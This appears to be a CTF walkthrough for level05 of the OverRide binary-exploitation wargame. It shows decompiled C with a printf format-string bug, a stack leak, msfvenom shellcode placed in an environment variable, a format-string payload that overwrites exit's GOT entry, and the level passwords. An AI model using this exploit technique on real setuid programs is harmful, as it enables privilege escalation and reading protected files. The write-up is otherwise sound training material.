```
level05 : 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

![](Pasted%20image%2020240808194608.png)

```c
void main(void)

{
  byte bVar1;
  uint uVar2;
  byte *pbVar3;
  byte bVar4;
  byte local_78 [100];
  uint local_14;
  
  bVar4 = 0;
  local_14 = 0;
  fgets((char *)local_78,100,stdin);
  local_14 = 0;
  do {
    uVar2 = 4294967295;
    pbVar3 = local_78;
    do {
      if (uVar2 == 0) break;
      uVar2 = uVar2 - 1;
      bVar1 = *pbVar3;
      pbVar3 = pbVar3 + (uint)bVar4 * -2 + 1;
    } while (bVar1 != 0);
    if (~uVar2 - 1 <= local_14) {
      printf((char *)local_78);
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    if (('@' < (char)local_78[local_14]) && ((char)local_78[local_14] < '[')) {
      local_78[local_14] = local_78[local_14] ^ 32;
    }
    local_14 = local_14 + 1;
  } while( true );
}
```

![](Pasted%20image%2020240808200536.png)

```
(remote) level05@OverRide:/home/users/level05$ ./level05 
BBBB %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
bbbb 64 f7fcfac0 f7ec3add ffffd63f ffffd63e 0 ffffffff ffffd6c4 f7fdb000 62626262
```

BBB est converti par le main en bbbb ce qui represente 62626262 en ASCII
on a leak la position de local_78 a la 6eme position dans la stack

avec gdb on va récupérer l'adresse @got de exit

```
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *q
   
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330
End of assembler dump.
(gdb)
```

```
❯ msfvenom -p linux/x86/exec CMD="/bin/cat /home/users/level06/.pass" –e x86/shikata_ga_nai -b "\x00\x0a\x1a\x2f" PrependSetuid=True -f py
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 104 (iteration=0)
x86/shikata_ga_nai chosen with final size 104
Payload size: 104 bytes
Final size of py file: 526 bytes
buf =  b""
buf += b"\xba\x96\x8f\xbe\x4f\xda\xca\xd9\x74\x24\xf4\x5b"
buf += b"\x2b\xc9\xb1\x14\x31\x53\x13\x83\xc3\x04\x03\x53"
buf += b"\x99\x6d\x4b\x7e\x7e\x1b\xa3\xd9\x4d\x5c\xa1\xd2"
buf += b"\x15\xc4\x64\x83\xcd\xdb\xeb\xc2\xea\x4c\xc3\xa7"
buf += b"\x9c\x8c\x73\x67\x3e\xe4\xed\xfe\x5d\xa4\x19\x23"
buf += b"\xa1\x49\xda\x0b\xc3\x20\xb4\x7c\x60\xd2\x3c\xa3"
buf += b"\x49\x7c\xd2\xce\xf0\x53\x59\x62\x9f\xd9\xd2\xab"
buf += b"\x33\x7b\x63\xd1\xa7\xb3\xbd\x36\x19\xc4\xa0\x3b"
buf += b"\x16\x24\x74\xef\x51\xc5\xb7\x8f"

export EVIL=`python -c 'print "\x90" * 525 + "\xba\x96\x8f\xbe\x4f\xda\xca\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1\x14\x31\x53\x13\x83\xc3\x04\x03\x53\x99\x6d\x4b\x7e\x7e\x1b\xa3\xd9\x4d\x5c\xa1\xd2\x15\xc4\x64\x83\xcd\xdb\xeb\xc2\xea\x4c\xc3\xa7\x9c\x8c\x73\x67\x3e\xe4\xed\xfe\x5d\xa4\x19\x23\xa1\x49\xda\x0b\xc3\x20\xb4\x7c\x60\xd2\x3c\xa3\x49\x7c\xd2\xce\xf0\x53\x59\x62\x9f\xd9\xd2\xab\x33\x7b\x63\xd1\xa7\xb3\xbd\x36\x19\xc4\xa0\x3b\x16\x24\x74\xef\x51\xc5\xb7\x8f"'`

x/s *((char **)environ+3)
x/150xg 0xffffd69a

0xffffd71a
```

![](Pasted%20image%2020240808203027.png)


```python
hex_address = "0xffff"
int_address = int(hex_address, 16)
print(f"Hex: {hex_address}\nInt: {int_address}")
hex_address = "0xd8a7"
int_address = int(hex_address, 16)
print(f"Hex: {hex_address}\nInt: {int_address}")
```


```
ffff => 65535
d8a7 => 55463

55463 - 55455
65535 - 55463 => 10072

python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55455d%10\$hn' + '%10072d%11\$hn'" | ./level05
```

![](Pasted%20image%2020240808233014.png)

```
level06 : h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```